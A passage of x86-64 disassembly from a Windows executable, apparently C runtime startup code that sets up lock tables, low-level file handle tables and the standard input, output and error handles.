   140009c30:	48 8b 6c 24 58       	mov    0x58(%rsp),%rbp
   140009c35:	48 8b 74 24 60       	mov    0x60(%rsp),%rsi
   140009c3a:	48 8b 7c 24 68       	mov    0x68(%rsp),%rdi
   140009c3f:	48 83 c4 40          	add    $0x40,%rsp
   140009c43:	41 5e                	pop    %r14
   140009c45:	c3                   	ret
   140009c46:	cc                   	int3
   140009c47:	cc                   	int3
   140009c48:	40 53                	rex push %rbx
   140009c4a:	48 83 ec 20          	sub    $0x20,%rsp
   140009c4e:	33 db                	xor    %ebx,%ebx
   140009c50:	48 8d 15 b9 52 01 00 	lea    0x152b9(%rip),%rdx        # 0x14001ef10
   140009c57:	45 33 c0             	xor    %r8d,%r8d
   140009c5a:	48 8d 0c 9b          	lea    (%rbx,%rbx,4),%rcx
   140009c5e:	48 8d 0c ca          	lea    (%rdx,%rcx,8),%rcx
   140009c62:	ba a0 0f 00 00       	mov    $0xfa0,%edx
   140009c67:	e8 2c 12 00 00       	call   0x14000ae98
   140009c6c:	85 c0                	test   %eax,%eax
   140009c6e:	74 11                	je     0x140009c81
   140009c70:	ff 05 f2 54 01 00    	incl   0x154f2(%rip)        # 0x14001f168
   140009c76:	ff c3                	inc    %ebx
   140009c78:	83 fb 0f             	cmp    $0xf,%ebx
   140009c7b:	72 d3                	jb     0x140009c50
   140009c7d:	b0 01                	mov    $0x1,%al
   140009c7f:	eb 09                	jmp    0x140009c8a
   140009c81:	33 c9                	xor    %ecx,%ecx
   140009c83:	e8 24 00 00 00       	call   0x140009cac
   140009c88:	32 c0                	xor    %al,%al
   140009c8a:	48 83 c4 20          	add    $0x20,%rsp
   140009c8e:	5b                   	pop    %rbx
   140009c8f:	c3                   	ret
   140009c90:	48 63 c1             	movslq %ecx,%rax
   140009c93:	48 8d 0c 80          	lea    (%rax,%rax,4),%rcx
   140009c97:	48 8d 05 72 52 01 00 	lea    0x15272(%rip),%rax        # 0x14001ef10
   140009c9e:	48 8d 0c c8          	lea    (%rax,%rcx,8),%rcx
   140009ca2:	48 ff 25 1f 64 00 00 	rex.W jmp *0x641f(%rip)        # 0x1400100c8
   140009ca9:	cc                   	int3
   140009caa:	cc                   	int3
   140009cab:	cc                   	int3
   140009cac:	40 53                	rex push %rbx
   140009cae:	48 83 ec 20          	sub    $0x20,%rsp
   140009cb2:	8b 1d b0 54 01 00    	mov    0x154b0(%rip),%ebx        # 0x14001f168
   140009cb8:	eb 1d                	jmp    0x140009cd7
   140009cba:	48 8d 05 4f 52 01 00 	lea    0x1524f(%rip),%rax        # 0x14001ef10
   140009cc1:	ff cb                	dec    %ebx
   140009cc3:	48 8d 0c 9b          	lea    (%rbx,%rbx,4),%rcx
   140009cc7:	48 8d 0c c8          	lea    (%rax,%rcx,8),%rcx
   140009ccb:	ff 15 0f 64 00 00    	call   *0x640f(%rip)        # 0x1400100e0
   140009cd1:	ff 0d 91 54 01 00    	decl   0x15491(%rip)        # 0x14001f168
   140009cd7:	85 db                	test   %ebx,%ebx
   140009cd9:	75 df                	jne    0x140009cba
   140009cdb:	b0 01                	mov    $0x1,%al
   140009cdd:	48 83 c4 20          	add    $0x20,%rsp
   140009ce1:	5b                   	pop    %rbx
   140009ce2:	c3                   	ret
   140009ce3:	cc                   	int3
   140009ce4:	48 63 c1             	movslq %ecx,%rax
   140009ce7:	48 8d 0c 80          	lea    (%rax,%rax,4),%rcx
   140009ceb:	48 8d 05 1e 52 01 00 	lea    0x1521e(%rip),%rax        # 0x14001ef10
   140009cf2:	48 8d 0c c8          	lea    (%rax,%rcx,8),%rcx
   140009cf6:	48 ff 25 d3 63 00 00 	rex.W jmp *0x63d3(%rip)        # 0x1400100d0
   140009cfd:	cc                   	int3
   140009cfe:	cc                   	int3
   140009cff:	cc                   	int3
   140009d00:	65 48 8b 04 25 30 00 	mov    %gs:0x30,%rax
   140009d07:	00 00 
   140009d09:	48 8b 48 60          	mov    0x60(%rax),%rcx
   140009d0d:	8b 81 bc 00 00 00    	mov    0xbc(%rcx),%eax
   140009d13:	c1 e8 08             	shr    $0x8,%eax
   140009d16:	24 01                	and    $0x1,%al
   140009d18:	c3                   	ret
   140009d19:	cc                   	int3
   140009d1a:	cc                   	int3
   140009d1b:	cc                   	int3
   140009d1c:	65 48 8b 04 25 30 00 	mov    %gs:0x30,%rax
   140009d23:	00 00 
   140009d25:	48 8b 48 60          	mov    0x60(%rax),%rcx
   140009d29:	48 8b 41 20          	mov    0x20(%rcx),%rax
   140009d2d:	8b 40 08             	mov    0x8(%rax),%eax
   140009d30:	c1 e8 1f             	shr    $0x1f,%eax
   140009d33:	c3                   	ret
   140009d34:	40 53                	rex push %rbx
   140009d36:	48 83 ec 20          	sub    $0x20,%rsp
   140009d3a:	33 db                	xor    %ebx,%ebx
   140009d3c:	89 5c 24 30          	mov    %ebx,0x30(%rsp)
   140009d40:	e8 d7 ff ff ff       	call   0x140009d1c
   140009d45:	84 c0                	test   %al,%al
   140009d47:	75 0a                	jne    0x140009d53
   140009d49:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140009d4e:	e8 71 10 00 00       	call   0x14000adc4
   140009d53:	83 7c 24 30 01       	cmpl   $0x1,0x30(%rsp)
   140009d58:	0f 95 c3             	setne  %bl
   140009d5b:	8b c3                	mov    %ebx,%eax
   140009d5d:	48 83 c4 20          	add    $0x20,%rsp
   140009d61:	5b                   	pop    %rbx
   140009d62:	c3                   	ret
   140009d63:	cc                   	int3
   140009d64:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140009d69:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   140009d6e:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   140009d73:	57                   	push   %rdi
   140009d74:	48 83 ec 20          	sub    $0x20,%rsp
   140009d78:	ba 48 00 00 00       	mov    $0x48,%edx
   140009d7d:	8d 4a f8             	lea    -0x8(%rdx),%ecx
   140009d80:	e8 0b e2 ff ff       	call   0x140007f90
   140009d85:	33 f6                	xor    %esi,%esi
   140009d87:	48 8b d8             	mov    %rax,%rbx
   140009d8a:	48 85 c0             	test   %rax,%rax
   140009d8d:	74 5b                	je     0x140009dea
   140009d8f:	48 8d a8 00 12 00 00 	lea    0x1200(%rax),%rbp
   140009d96:	48 3b c5             	cmp    %rbp,%rax
   140009d99:	74 4c                	je     0x140009de7
   140009d9b:	48 8d 78 30          	lea    0x30(%rax),%rdi
   140009d9f:	48 8d 4f d0          	lea    -0x30(%rdi),%rcx
   140009da3:	45 33 c0             	xor    %r8d,%r8d
   140009da6:	ba a0 0f 00 00       	mov    $0xfa0,%edx
   140009dab:	e8 e8 10 00 00       	call   0x14000ae98
   140009db0:	48 83 4f f8 ff       	orq    $0xffffffffffffffff,-0x8(%rdi)
   140009db5:	48 8d 4f 0e          	lea    0xe(%rdi),%rcx
   140009db9:	80 67 0d f8          	andb   $0xf8,0xd(%rdi)
   140009dbd:	8b c6                	mov    %esi,%eax
   140009dbf:	48 89 37             	mov    %rsi,(%rdi)
   140009dc2:	c7 47 08 00 00 0a 0a 	movl   $0xa0a0000,0x8(%rdi)
   140009dc9:	c6 47 0c 0a          	movb   $0xa,0xc(%rdi)
   140009dcd:	40 88 31             	mov    %sil,(%rcx)
   140009dd0:	ff c0                	inc    %eax
   140009dd2:	48 ff c1             	inc    %rcx
   140009dd5:	83 f8 05             	cmp    $0x5,%eax
   140009dd8:	72 f3                	jb     0x140009dcd
   140009dda:	48 83 c7 48          	add    $0x48,%rdi
   140009dde:	48 8d 47 d0          	lea    -0x30(%rdi),%rax
   140009de2:	48 3b c5             	cmp    %rbp,%rax
   140009de5:	75 b8                	jne    0x140009d9f
   140009de7:	48 8b f3             	mov    %rbx,%rsi
   140009dea:	33 c9                	xor    %ecx,%ecx
   140009dec:	e8 1f e2 ff ff       	call   0x140008010
   140009df1:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140009df6:	48 8b c6             	mov    %rsi,%rax
   140009df9:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   140009dfe:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   140009e03:	48 83 c4 20          	add    $0x20,%rsp
   140009e07:	5f                   	pop    %rdi
   140009e08:	c3                   	ret
   140009e09:	cc                   	int3
   140009e0a:	cc                   	int3
   140009e0b:	cc                   	int3
   140009e0c:	48 85 c9             	test   %rcx,%rcx
   140009e0f:	74 4a                	je     0x140009e5b
   140009e11:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140009e16:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   140009e1b:	57                   	push   %rdi
   140009e1c:	48 83 ec 20          	sub    $0x20,%rsp
   140009e20:	48 8d b1 00 12 00 00 	lea    0x1200(%rcx),%rsi
   140009e27:	48 8b d9             	mov    %rcx,%rbx
   140009e2a:	48 8b f9             	mov    %rcx,%rdi
   140009e2d:	48 3b ce             	cmp    %rsi,%rcx
   140009e30:	74 12                	je     0x140009e44
   140009e32:	48 8b cf             	mov    %rdi,%rcx
   140009e35:	ff 15 a5 62 00 00    	call   *0x62a5(%rip)        # 0x1400100e0
   140009e3b:	48 83 c7 48          	add    $0x48,%rdi
   140009e3f:	48 3b fe             	cmp    %rsi,%rdi
   140009e42:	75 ee                	jne    0x140009e32
   140009e44:	48 8b cb             	mov    %rbx,%rcx
   140009e47:	e8 c4 e1 ff ff       	call   0x140008010
   140009e4c:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140009e51:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   140009e56:	48 83 c4 20          	add    $0x20,%rsp
   140009e5a:	5f                   	pop    %rdi
   140009e5b:	c3                   	ret
   140009e5c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140009e61:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   140009e66:	48 89 7c 24 18       	mov    %rdi,0x18(%rsp)
   140009e6b:	41 57                	push   %r15
   140009e6d:	48 83 ec 30          	sub    $0x30,%rsp
   140009e71:	8b f1                	mov    %ecx,%esi
   140009e73:	81 f9 00 20 00 00    	cmp    $0x2000,%ecx
   140009e79:	72 29                	jb     0x140009ea4
   140009e7b:	e8 ec e0 ff ff       	call   0x140007f6c
   140009e80:	bb 09 00 00 00       	mov    $0x9,%ebx
   140009e85:	89 18                	mov    %ebx,(%rax)
   140009e87:	e8 38 df ff ff       	call   0x140007dc4
   140009e8c:	8b c3                	mov    %ebx,%eax
   140009e8e:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   140009e93:	48 8b 74 24 48       	mov    0x48(%rsp),%rsi
   140009e98:	48 8b 7c 24 50       	mov    0x50(%rsp),%rdi
   140009e9d:	48 83 c4 30          	add    $0x30,%rsp
   140009ea1:	41 5f                	pop    %r15
   140009ea3:	c3                   	ret
   140009ea4:	33 ff                	xor    %edi,%edi
   140009ea6:	8d 4f 07             	lea    0x7(%rdi),%ecx
   140009ea9:	e8 e2 fd ff ff       	call   0x140009c90
   140009eae:	90                   	nop
   140009eaf:	8b df                	mov    %edi,%ebx
   140009eb1:	8b 05 b9 56 01 00    	mov    0x156b9(%rip),%eax        # 0x14001f570
   140009eb7:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   140009ebc:	3b f0                	cmp    %eax,%esi
   140009ebe:	7c 36                	jl     0x140009ef6
   140009ec0:	4c 8d 3d a9 52 01 00 	lea    0x152a9(%rip),%r15        # 0x14001f170
   140009ec7:	49 39 3c df          	cmp    %rdi,(%r15,%rbx,8)
   140009ecb:	74 02                	je     0x140009ecf
   140009ecd:	eb 22                	jmp    0x140009ef1
   140009ecf:	e8 90 fe ff ff       	call   0x140009d64
   140009ed4:	49 89 04 df          	mov    %rax,(%r15,%rbx,8)
   140009ed8:	48 85 c0             	test   %rax,%rax
   140009edb:	75 05                	jne    0x140009ee2
   140009edd:	8d 78 0c             	lea    0xc(%rax),%edi
   140009ee0:	eb 14                	jmp    0x140009ef6
   140009ee2:	8b 05 88 56 01 00    	mov    0x15688(%rip),%eax        # 0x14001f570
   140009ee8:	83 c0 40             	add    $0x40,%eax
   140009eeb:	89 05 7f 56 01 00    	mov    %eax,0x1567f(%rip)        # 0x14001f570
   140009ef1:	48 ff c3             	inc    %rbx
   140009ef4:	eb c1                	jmp    0x140009eb7
   140009ef6:	b9 07 00 00 00       	mov    $0x7,%ecx
   140009efb:	e8 e4 fd ff ff       	call   0x140009ce4
   140009f00:	8b c7                	mov    %edi,%eax
   140009f02:	eb 8a                	jmp    0x140009e8e
   140009f04:	48 63 d1             	movslq %ecx,%rdx
   140009f07:	4c 8d 05 62 52 01 00 	lea    0x15262(%rip),%r8        # 0x14001f170
   140009f0e:	48 8b c2             	mov    %rdx,%rax
   140009f11:	83 e2 3f             	and    $0x3f,%edx
   140009f14:	48 c1 f8 06          	sar    $0x6,%rax
   140009f18:	48 8d 0c d2          	lea    (%rdx,%rdx,8),%rcx
   140009f1c:	49 8b 04 c0          	mov    (%r8,%rax,8),%rax
   140009f20:	48 8d 0c c8          	lea    (%rax,%rcx,8),%rcx
   140009f24:	48 ff 25 9d 61 00 00 	rex.W jmp *0x619d(%rip)        # 0x1400100c8
   140009f2b:	cc                   	int3
   140009f2c:	48 63 d1             	movslq %ecx,%rdx
   140009f2f:	4c 8d 05 3a 52 01 00 	lea    0x1523a(%rip),%r8        # 0x14001f170
   140009f36:	48 8b c2             	mov    %rdx,%rax
   140009f39:	83 e2 3f             	and    $0x3f,%edx
   140009f3c:	48 c1 f8 06          	sar    $0x6,%rax
   140009f40:	48 8d 0c d2          	lea    (%rdx,%rdx,8),%rcx
   140009f44:	49 8b 04 c0          	mov    (%r8,%rax,8),%rax
   140009f48:	48 8d 0c c8          	lea    (%rax,%rcx,8),%rcx
   140009f4c:	48 ff 25 7d 61 00 00 	rex.W jmp *0x617d(%rip)        # 0x1400100d0
   140009f53:	cc                   	int3
   140009f54:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140009f59:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   140009f5e:	48 89 7c 24 18       	mov    %rdi,0x18(%rsp)
   140009f63:	41 56                	push   %r14
   140009f65:	48 83 ec 20          	sub    $0x20,%rsp
   140009f69:	48 63 d9             	movslq %ecx,%rbx
   140009f6c:	85 c9                	test   %ecx,%ecx
   140009f6e:	78 72                	js     0x140009fe2
   140009f70:	3b 1d fa 55 01 00    	cmp    0x155fa(%rip),%ebx        # 0x14001f570
   140009f76:	73 6a                	jae    0x140009fe2
   140009f78:	48 8b c3             	mov    %rbx,%rax
   140009f7b:	4c 8d 35 ee 51 01 00 	lea    0x151ee(%rip),%r14        # 0x14001f170
   140009f82:	83 e0 3f             	and    $0x3f,%eax
   140009f85:	48 8b f3             	mov    %rbx,%rsi
   140009f88:	48 c1 ee 06          	shr    $0x6,%rsi
   140009f8c:	48 8d 3c c0          	lea    (%rax,%rax,8),%rdi
   140009f90:	49 8b 04 f6          	mov    (%r14,%rsi,8),%rax
   140009f94:	f6 44 f8 38 01       	testb  $0x1,0x38(%rax,%rdi,8)
   140009f99:	74 47                	je     0x140009fe2
   140009f9b:	48 83 7c f8 28 ff    	cmpq   $0xffffffffffffffff,0x28(%rax,%rdi,8)
   140009fa1:	74 3f                	je     0x140009fe2
   140009fa3:	e8 5c c1 ff ff       	call   0x140006104
   140009fa8:	83 f8 01             	cmp    $0x1,%eax
   140009fab:	75 27                	jne    0x140009fd4
   140009fad:	85 db                	test   %ebx,%ebx
   140009faf:	74 16                	je     0x140009fc7
   140009fb1:	2b d8                	sub    %eax,%ebx
   140009fb3:	74 0b                	je     0x140009fc0
   140009fb5:	3b d8                	cmp    %eax,%ebx
   140009fb7:	75 1b                	jne    0x140009fd4
   140009fb9:	b9 f4 ff ff ff       	mov    $0xfffffff4,%ecx
   140009fbe:	eb 0c                	jmp    0x140009fcc
   140009fc0:	b9 f5 ff ff ff       	mov    $0xfffffff5,%ecx
   140009fc5:	eb 05                	jmp    0x140009fcc
   140009fc7:	b9 f6 ff ff ff       	mov    $0xfffffff6,%ecx
   140009fcc:	33 d2                	xor    %edx,%edx
   140009fce:	ff 15 14 62 00 00    	call   *0x6214(%rip)        # 0x1400101e8
   140009fd4:	49 8b 04 f6          	mov    (%r14,%rsi,8),%rax
   140009fd8:	48 83 4c f8 28 ff    	orq    $0xffffffffffffffff,0x28(%rax,%rdi,8)
   140009fde:	33 c0                	xor    %eax,%eax
   140009fe0:	eb 16                	jmp    0x140009ff8
   140009fe2:	e8 85 df ff ff       	call   0x140007f6c
   140009fe7:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   140009fed:	e8 56 df ff ff       	call   0x140007f48
   140009ff2:	83 20 00             	andl   $0x0,(%rax)
   140009ff5:	83 c8 ff             	or     $0xffffffff,%eax
   140009ff8:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140009ffd:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   14000a002:	48 8b 7c 24 40       	mov    0x40(%rsp),%rdi
   14000a007:	48 83 c4 20          	add    $0x20,%rsp
   14000a00b:	41 5e                	pop    %r14
   14000a00d:	c3                   	ret
   14000a00e:	cc                   	int3
   14000a00f:	cc                   	int3
   14000a010:	48 83 ec 28          	sub    $0x28,%rsp
   14000a014:	83 f9 fe             	cmp    $0xfffffffe,%ecx
   14000a017:	75 15                	jne    0x14000a02e
   14000a019:	e8 2a df ff ff       	call   0x140007f48
   14000a01e:	83 20 00             	andl   $0x0,(%rax)
   14000a021:	e8 46 df ff ff       	call   0x140007f6c
   14000a026:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   14000a02c:	eb 4e                	jmp    0x14000a07c
   14000a02e:	85 c9                	test   %ecx,%ecx
   14000a030:	78 32                	js     0x14000a064
   14000a032:	3b 0d 38 55 01 00    	cmp    0x15538(%rip),%ecx        # 0x14001f570
   14000a038:	73 2a                	jae    0x14000a064
   14000a03a:	48 63 c9             	movslq %ecx,%rcx
   14000a03d:	4c 8d 05 2c 51 01 00 	lea    0x1512c(%rip),%r8        # 0x14001f170
   14000a044:	48 8b c1             	mov    %rcx,%rax
   14000a047:	83 e1 3f             	and    $0x3f,%ecx
   14000a04a:	48 c1 e8 06          	shr    $0x6,%rax
   14000a04e:	48 8d 14 c9          	lea    (%rcx,%rcx,8),%rdx
   14000a052:	49 8b 04 c0          	mov    (%r8,%rax,8),%rax
   14000a056:	f6 44 d0 38 01       	testb  $0x1,0x38(%rax,%rdx,8)
   14000a05b:	74 07                	je     0x14000a064
   14000a05d:	48 8b 44 d0 28       	mov    0x28(%rax,%rdx,8),%rax
   14000a062:	eb 1c                	jmp    0x14000a080
   14000a064:	e8 df de ff ff       	call   0x140007f48
   14000a069:	83 20 00             	andl   $0x0,(%rax)
   14000a06c:	e8 fb de ff ff       	call   0x140007f6c
   14000a071:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   14000a077:	e8 48 dd ff ff       	call   0x140007dc4
   14000a07c:	48 83 c8 ff          	or     $0xffffffffffffffff,%rax
   14000a080:	48 83 c4 28          	add    $0x28,%rsp
   14000a084:	c3                   	ret
   14000a085:	cc                   	int3
   14000a086:	cc                   	int3
   14000a087:	cc                   	int3
   14000a088:	83 3d dd 50 01 00 00 	cmpl   $0x0,0x150dd(%rip)        # 0x14001f16c
   14000a08f:	75 0a                	jne    0x14000a09b
   14000a091:	c7 05 d1 50 01 00 00 	movl   $0x4000,0x150d1(%rip)        # 0x14001f16c
   14000a098:	40 00 00 
   14000a09b:	33 c0                	xor    %eax,%eax
   14000a09d:	c3                   	ret
   14000a09e:	cc                   	int3
   14000a09f:	cc                   	int3
   14000a0a0:	48 8b c4             	mov    %rsp,%rax
   14000a0a3:	48 89 58 08          	mov    %rbx,0x8(%rax)
   14000a0a7:	48 89 68 10          	mov    %rbp,0x10(%rax)
   14000a0ab:	48 89 70 18          	mov    %rsi,0x18(%rax)
   14000a0af:	48 89 78 20          	mov    %rdi,0x20(%rax)
   14000a0b3:	41 56                	push   %r14
   14000a0b5:	48 81 ec 90 00 00 00 	sub    $0x90,%rsp
   14000a0bc:	33 d2                	xor    %edx,%edx
   14000a0be:	48 8d 48 88          	lea    -0x78(%rax),%rcx
   14000a0c2:	44 8d 42 68          	lea    0x68(%rdx),%r8d
   14000a0c6:	e8 35 50 00 00       	call   0x14000f100
   14000a0cb:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   14000a0d0:	ff 15 aa 5f 00 00    	call   *0x5faa(%rip)        # 0x140010080
   14000a0d6:	45 33 f6             	xor    %r14d,%r14d
   14000a0d9:	66 44 39 74 24 62    	cmp    %r14w,0x62(%rsp)
   14000a0df:	0f 84 9a 00 00 00    	je     0x14000a17f
   14000a0e5:	48 8b 44 24 68       	mov    0x68(%rsp),%rax
   14000a0ea:	48 85 c0             	test   %rax,%rax
   14000a0ed:	0f 84 8c 00 00 00    	je     0x14000a17f
   14000a0f3:	48 63 18             	movslq (%rax),%rbx
   14000a0f6:	48 8d 70 04          	lea    0x4(%rax),%rsi
   14000a0fa:	bf 00 20 00 00       	mov    $0x2000,%edi
   14000a0ff:	48 03 de             	add    %rsi,%rbx
   14000a102:	39 38                	cmp    %edi,(%rax)
   14000a104:	0f 4c 38             	cmovl  (%rax),%edi
   14000a107:	8b cf                	mov    %edi,%ecx
   14000a109:	e8 4e fd ff ff       	call   0x140009e5c
   14000a10e:	3b 3d 5c 54 01 00    	cmp    0x1545c(%rip),%edi        # 0x14001f570
   14000a114:	0f 4f 3d 55 54 01 00 	cmovg  0x15455(%rip),%edi        # 0x14001f570
   14000a11b:	85 ff                	test   %edi,%edi
   14000a11d:	74 60                	je     0x14000a17f
   14000a11f:	41 8b ee             	mov    %r14d,%ebp
   14000a122:	48 83 3b ff          	cmpq   $0xffffffffffffffff,(%rbx)
   14000a126:	74 47                	je     0x14000a16f
   14000a128:	48 83 3b fe          	cmpq   $0xfffffffffffffffe,(%rbx)
   14000a12c:	74 41                	je     0x14000a16f
   14000a12e:	f6 06 01             	testb  $0x1,(%rsi)
   14000a131:	74 3c                	je     0x14000a16f
   14000a133:	f6 06 08             	testb  $0x8,(%rsi)
   14000a136:	75 0d                	jne    0x14000a145
   14000a138:	48 8b 0b             	mov    (%rbx),%rcx
   14000a13b:	ff 15 af 60 00 00    	call   *0x60af(%rip)        # 0x1400101f0
   14000a141:	85 c0                	test   %eax,%eax
   14000a143:	74 2a                	je     0x14000a16f
   14000a145:	48 8b c5             	mov    %rbp,%rax
   14000a148:	4c 8d 05 21 50 01 00 	lea    0x15021(%rip),%r8        # 0x14001f170
   14000a14f:	48 8b cd             	mov    %rbp,%rcx
   14000a152:	48 c1 f9 06          	sar    $0x6,%rcx
   14000a156:	83 e0 3f             	and    $0x3f,%eax
   14000a159:	49 8b 0c c8          	mov    (%r8,%rcx,8),%rcx
   14000a15d:	48 8d 14 c0          	lea    (%rax,%rax,8),%rdx
   14000a161:	48 8b 03             	mov    (%rbx),%rax
   14000a164:	48 89 44 d1 28       	mov    %rax,0x28(%rcx,%rdx,8)
   14000a169:	8a 06                	mov    (%rsi),%al
   14000a16b:	88 44 d1 38          	mov    %al,0x38(%rcx,%rdx,8)
   14000a16f:	48 ff c5             	inc    %rbp
   14000a172:	48 ff c6             	inc    %rsi
   14000a175:	48 83 c3 08          	add    $0x8,%rbx
   14000a179:	48 83 ef 01          	sub    $0x1,%rdi
   14000a17d:	75 a3                	jne    0x14000a122
   14000a17f:	4c 8d 9c 24 90 00 00 	lea    0x90(%rsp),%r11
   14000a186:	00 
   14000a187:	49 8b 5b 10          	mov    0x10(%r11),%rbx
   14000a18b:	49 8b 6b 18          	mov    0x18(%r11),%rbp
   14000a18f:	49 8b 73 20          	mov    0x20(%r11),%rsi
   14000a193:	49 8b 7b 28          	mov    0x28(%r11),%rdi
   14000a197:	49 8b e3             	mov    %r11,%rsp
   14000a19a:	41 5e                	pop    %r14
   14000a19c:	c3                   	ret
   14000a19d:	cc                   	int3
   14000a19e:	cc                   	int3
   14000a19f:	cc                   	int3
   14000a1a0:	48 8b c4             	mov    %rsp,%rax
   14000a1a3:	48 89 58 08          	mov    %rbx,0x8(%rax)
   14000a1a7:	48 89 68 10          	mov    %rbp,0x10(%rax)
   14000a1ab:	48 89 70 18          	mov    %rsi,0x18(%rax)
   14000a1af:	48 89 78 20          	mov    %rdi,0x20(%rax)
   14000a1b3:	41 56                	push   %r14
   14000a1b5:	48 83 ec 20          	sub    $0x20,%rsp
   14000a1b9:	33 f6                	xor    %esi,%esi
   14000a1bb:	45 33 f6             	xor    %r14d,%r14d
   14000a1be:	48 63 ce             	movslq %esi,%rcx
   14000a1c1:	48 8d 3d a8 4f 01 00 	lea    0x14fa8(%rip),%rdi        # 0x14001f170
   14000a1c8:	48 8b c1             	mov    %rcx,%rax
   14000a1cb:	83 e1 3f             	and    $0x3f,%ecx
   14000a1ce:	48 c1 f8 06          	sar    $0x6,%rax
   14000a1d2:	48 8d 1c c9          	lea    (%rcx,%rcx,8),%rbx
   14000a1d6:	48 8b 3c c7          	mov    (%rdi,%rax,8),%rdi
   14000a1da:	48 8b 44 df 28       	mov    0x28(%rdi,%rbx,8),%rax
   14000a1df:	48 83 c0 02          	add    $0x2,%rax
   14000a1e3:	48 83 f8 01          	cmp    $0x1,%rax
   14000a1e7:	76 0a                	jbe    0x14000a1f3
   14000a1e9:	80 4c df 38 80       	orb    $0x80,0x38(%rdi,%rbx,8)
   14000a1ee:	e9 8b 00 00 00       	jmp    0x14000a27e
   14000a1f3:	c6 44 df 38 81       	movb   $0x81,0x38(%rdi,%rbx,8)
   14000a1f8:	8b ce                	mov    %esi,%ecx
   14000a1fa:	85 f6                	test   %esi,%esi
   14000a1fc:	74 16                	je     0x14000a214
   14000a1fe:	83 e9 01             	sub    $0x1,%ecx
   14000a201:	74 0a                	je     0x14000a20d
   14000a203:	83 f9 01             	cmp    $0x1,%ecx
   14000a206:	b9 f4 ff ff ff       	mov    $0xfffffff4,%ecx
   14000a20b:	eb 0c                	jmp    0x14000a219
   14000a20d:	b9 f5 ff ff ff       	mov    $0xfffffff5,%ecx
   14000a212:	eb 05                	jmp    0x14000a219
   14000a214:	b9 f6 ff ff ff       	mov    $0xfffffff6,%ecx
   14000a219:	ff 15 e9 5e 00 00    	call   *0x5ee9(%rip)        # 0x140010108
   14000a21f:	48 8b e8             	mov    %rax,%rbp
   14000a222:	48 8d 48 01          	lea    0x1(%rax),%rcx
   14000a226:	48 83 f9 01          	cmp    $0x1,%rcx
   14000a22a:	76 2d                	jbe    0x14000a259
   14000a22c:	48 8b c8             	mov    %rax,%rcx
   14000a22f:	ff 15 bb 5f 00 00    	call   *0x5fbb(%rip)        # 0x1400101f0
   14000a235:	85 c0                	test   %eax,%eax
   14000a237:	74 20                	je     0x14000a259
   14000a239:	0f b6 c0             	movzbl %al,%eax
   14000a23c:	48 89 6c df 28       	mov    %rbp,0x28(%rdi,%rbx,8)
   14000a241:	83 f8 02             	cmp    $0x2,%eax
   14000a244:	75 07                	jne    0x14000a24d
   14000a246:	80 4c df 38 40       	orb    $0x40,0x38(%rdi,%rbx,8)
   14000a24b:	eb 31                	jmp    0x14000a27e
   14000a24d:	83 f8 03             	cmp    $0x3,%eax
   14000a250:	75 2c                	jne    0x14000a27e
   14000a252:	80 4c df 38 08       	orb    $0x8,0x38(%rdi,%rbx,8)
   14000a257:	eb 25                	jmp    0x14000a27e
   14000a259:	80 4c df 38 40       	orb    $0x40,0x38(%rdi,%rbx,8)
   14000a25e:	48 c7 44 df 28 fe ff 	movq   $0xfffffffffffffffe,0x28(%rdi,%rbx,8)
   14000a265:	ff ff 
   14000a267:	48 8b 05 0a 54 01 00 	mov    0x1540a(%rip),%rax        # 0x14001f678
   14000a26e:	48 85 c0             	test   %rax,%rax
   14000a271:	74 0b                	je     0x14000a27e
   14000a273:	49 8b 04 06          	mov    (%r14,%rax,1),%rax
   14000a277:	c7 40 18 fe ff ff ff 	movl   $0xfffffffe,0x18(%rax)
   14000a27e:	ff c6                	inc    %esi
   14000a280:	49 83 c6 08          	add    $0x8,%r14
   14000a284:	83 fe 03             	cmp    $0x3,%esi
   14000a287:	0f 85 31 ff ff ff    	jne    0x14000a1be
   14000a28d:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000a292:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   14000a297:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   14000a29c:	48 8b 7c 24 48       	mov    0x48(%rsp),%rdi
   14000a2a1:	48 83 c4 20          	add    $0x20,%rsp
   14000a2a5:	41 5e                	pop    %r14
   14000a2a7:	c3                   	ret
   14000a2a8:	40 53                	rex push %rbx
   14000a2aa:	48 83 ec 20          	sub    $0x20,%rsp
   14000a2ae:	b9 07 00 00 00       	mov    $0x7,%ecx
   14000a2b3:	e8 d8 f9 ff ff       	call   0x140009c90
   14000a2b8:	33 db                	xor    %ebx,%ebx
   14000a2ba:	33 c9                	xor    %ecx,%ecx
   14000a2bc:	e8 9b fb ff ff       	call   0x140009e5c
   14000a2c1:	85 c0                	test   %eax,%eax
   14000a2c3:	75 0c                	jne    0x14000a2d1
   14000a2c5:	e8 d6 fd ff ff       	call   0x14000a0a0
   14000a2ca:	e8 d1 fe ff ff       	call   0x14000a1a0
   14000a2cf:	b3 01                	mov    $0x1,%bl
   14000a2d1:	b9 07 00 00 00       	mov    $0x7,%ecx
   14000a2d6:	e8 09 fa ff ff       	call   0x140009ce4
   14000a2db:	8a c3                	mov    %bl,%al
   14000a2dd:	48 83 c4 20          	add    $0x20,%rsp
   14000a2e1:	5b                   	pop    %rbx
   14000a2e2:	c3                   	ret
   14000a2e3:	cc                   	int3
